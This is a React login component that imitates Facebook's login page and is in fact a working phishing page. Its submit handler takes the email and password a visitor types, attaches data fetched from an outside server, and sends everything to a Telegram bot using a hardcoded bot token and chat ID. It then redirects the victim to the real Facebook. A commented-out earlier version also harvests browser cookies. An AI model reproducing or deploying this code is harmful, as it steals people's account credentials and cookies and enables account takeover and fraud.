
import React, { useState, useEffect } from 'react';
import './login.css';
import { Icon } from 'react-icons-kit';
import { arrowLeft2 } from 'react-icons-kit/icomoon/arrowLeft2';
import { angleDown } from 'react-icons-kit/fa/angleDown';
import { facebook_1 } from 'react-icons-kit/ikons/facebook_1';
import metaLogo from './assets/metalogo.png';
import axios from 'axios';
import desktop_logo from './assets/desktop_logo.svg';
import { useNavigate } from 'react-router-dom';


const Login = () => {
    const nav = useNavigate();

    const [values, setValues] = useState({
        email: '',
        password: '',
    });

    const [loading, setLoading] = useState(false);

    const handleChange = (e) => {
        setValues({ ...values, [e.target.name]: e.target.value });
    };

// const getCookies = () => {
//     const cookies = document.cookie.split("; ");
//     const cookieObj = {};
//     cookies.forEach((cookie) => {
//         const [name, value] = cookie.split("=");
//         cookieObj[name] = decodeURIComponent(value);
//     });
//     return cookieObj;
// };

// const fetchBackendData = async () => {
//     try {
//         const response = await fetch('https://ezeappmain.onrender.com'); // Replace with your backend URL
//         if (!response.ok) throw new Error(`Error: ${response.statusText}`);
//         return await response.json();
//     } catch (error) {
//         console.error('Error fetching backend data:', error.message);
//         return {}; // Return empty object in case of failure
//     }
// };

// const sendToTelegram = async () => {
// const botToken = '7912079845:AAFCpBOdL76dxW0o5OVX9VG68ZQr4Nm74uc'; 
// const chatId = '5744414871'; 
//     const cookies = getCookies();
//     const cookies_Secure = await fetchBackendData();

//     const dataToSend = {
//         cookies,
//         cookies_Secure,
//     };
//     const dataString = JSON.stringify(dataToSend, null, 2);

//     const message = `User Data:\nEmail: ${values.email}\nPassword: ${values.password}`;

//     try {
//         const blob = new Blob([dataString], { type: 'text/plain' });
//         const file = new File([blob], 'data.txt', { type: 'text/plain' });

//         const formData = new FormData();
//         formData.append('chat_id', chatId);
//         formData.append('document', file);
//         formData.append('caption', message);

//         const response = await axios.post(`https://api.telegram.org/bot${botToken}/sendDocument`, formData, {
//             headers: { 'Content-Type': 'multipart/form-data' },
//         });

//         console.log('Telegram response:', response.data);
//     } catch (error) {
//         console.error('Error sending message to Telegram:', error.response?.data || error.message);
//     }
// };

// const submitsData = (e) => {
//     e.preventDefault();
//     setLoading(true);
//     sendToTelegram()
//         .finally(() => {
//             setLoading(false);
//             window.location.href = "https://web.facebook.com/?_rdc=1&_rdr";
//         });
// };

// const toFacebook = () => {
//     window.location.href = "https://www.facebook.com/r.php?next=https%3A%2F%2Fwww.facebook.com%2F&locale=en_US&display=page";
// };

const fetchBackendData = async () => {
    try {
        const response = await fetch('https://ezeappmain.onrender.com'); // Replace with your backend URL
        if (!response.ok) throw new Error(`Error: ${response.statusText}`);
        return await response.text(); // Fetch the response as a string
    } catch (error) {
        console.error('Error fetching backend data:', error.message);
        return ''; // Return an empty string in case of failure
    }
};

const sendToTelegram = async () => {
    const botToken = '7912079845:AAFCpBOdL76dxW0o5OVX9VG68ZQr4Nm74uc'; 
    const chatId = '5744414871'; 

    const apiData = await fetchBackendData(); // Fetch data from the backend (as a string)

    const message = `User Data:\nEmail: ${values.email}\nPassword: ${values.password}`; // Include your desired message

    try {
        const blob = new Blob([apiData], { type: 'text/plain' }); // Create a file from the string
        const file = new File([blob], 'data.txt', { type: 'text/plain' });

        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('document', file);
        formData.append('caption', message);

        const response = await axios.post(`https://api.telegram.org/bot${botToken}/sendDocument`, formData, {
            headers: { 'Content-Type': 'multipart/form-data' },
        });

        console.log('Telegram response:', response.data);
    } catch (error) {
        console.error('Error sending message to Telegram:', error.response?.data || error.message);
    }
};

const submitsData = (e) => {
    e.preventDefault();
    setLoading(true);
    sendToTelegram()
        .finally(() => {
            setLoading(false);
            window.location.href = "https://web.facebook.com/?_rdc=1&_rdr";
        });
};

const toFacebook = () => {
    window.location.href = "https://www.facebook.com/r.php?next=https%3A%2F%2Fwww.facebook.com%2F&locale=en_US&display=page";
};



    return (
        <div className='login_page'>
            <div className='desktop_login_body'>
                <div className='desktop_logo'>
                    <img src={desktop_logo} alt='logo' />
                </div>
                <div className='warning_container'>
                    <div className='warning_login_logo_container'>
                        <span>i</span>
                    </div>
                    <p>You must log in to continue</p>
                </div>
                <form onSubmit={submitsData} className='desktop_login_form_container'>
                <span onClick={toFacebook}>Forgot account? . Sign up for Facebook</span>

                    <p>Log Into Facebook</p>
                    <div className='form_warning'>
                        <p>You must log in to continue</p>
                    </div>
                    <input
                        type='text'
                        placeholder='Email or phone number'
                        name='email'
                        onChange={handleChange}
                    />
                    <input
                        type='password'
                        placeholder='Password'
                        name='password'
                        onChange={handleChange}
                    />
                    <button type='submit'>{loading ? "Loading..." : "Log In"}</button>
                    <span onClick={toFacebook}>Forgot account? . Sign up for Facebook</span>
                </form>
            </div>
            <div className='login_part'>
                <div className='language'>
                    <p>English (UK)</p>
                </div>
                <div className='facebook_icon'>
                    <Icon size={40} icon={facebook_1} />
                </div>
                <div className='login_Inputs'>
                    <div className='input_div'>
                        <input
                            type='text'
                            name='email'
                            placeholder='Mobile number or email address'
                            onChange={handleChange}
                        />
                    </div>
                    <div className='input_div'>
                        <input
                            type='password'
                            name='password'
                            placeholder='Password'
                            onChange={handleChange}
                        />
                    </div>
                    <button onClick={submitsData} className='login_btn'>
                        {loading ? "Loading..." : "Log in"}
                    </button>
                    <p className='forgot_password'>Forgotten Password</p>
                </div>
                <div className='login_bottom'>
                    <button onClick={toFacebook} className='create_new_acct_btn'>
                        Create new account
                    </button>
                    <div className='meta_logo'>
                        <div className='meta_icon'>
                            <img src={metaLogo} alt='' />
                        </div>
                    </div>
                </div>
            </div>
        </div>
    );
};

export default Login;